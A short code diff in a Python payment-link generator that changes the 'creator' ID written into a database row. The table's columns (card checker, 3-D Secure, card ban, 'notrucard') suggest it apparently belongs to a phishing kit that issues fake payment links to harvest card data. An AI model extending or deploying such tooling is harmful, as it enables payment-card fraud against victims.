@@ -26,7 +26,7 @@ def generate_payment_link(amount):
 
     mycursor = mydb.cursor()
     sql = "INSERT INTO path (link,creator,method,sum,x,ip,cheker,success,nomoney,limited,error,threeds,disablepay,cardban,notrucard) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"
-    val = (linkgen, '6570604823', 0, amount, 2, myresult[2], 0, 0, 0, 0, 0, 0, 0, 0, 0)
+    val = (linkgen, '1931264620', 0, amount, 2, myresult[2], 0, 0, 0, 0, 0, 0, 0, 0, 0)
     mycursor.execute(sql, val)
     mydb.commit()
     mycursor.close()
